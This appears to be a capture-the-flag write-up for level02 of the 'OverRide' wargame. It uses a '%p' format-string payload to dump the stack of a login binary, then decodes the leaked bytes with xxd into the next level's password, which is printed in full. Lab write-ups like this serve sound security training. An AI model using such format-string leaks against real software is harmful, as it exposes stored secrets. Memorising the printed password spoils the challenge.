level02@OverRide:~$ python -c "print('AAAAAAAA' +'%p.' * 100)" | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAAAAAA0x7fffffffe500.(nil).0x70.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6f8.0x1f7ff9a08.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x100252e70.(nil).
0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x4141414141414141.
0x70252e70252e7025.0x252e70252e70252e. does not have access!

We can find in gdb that the code read from the .pass file just before our input. It means that the password should be on the
stack right before our input. Exploiting printf, we can print the stack and locate the password. We must take it backward like so:

0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848

And than, using xxd, we convert it back to decimal:

level02@OverRide:~$ echo '0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848' | xxd -p -r | rev
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
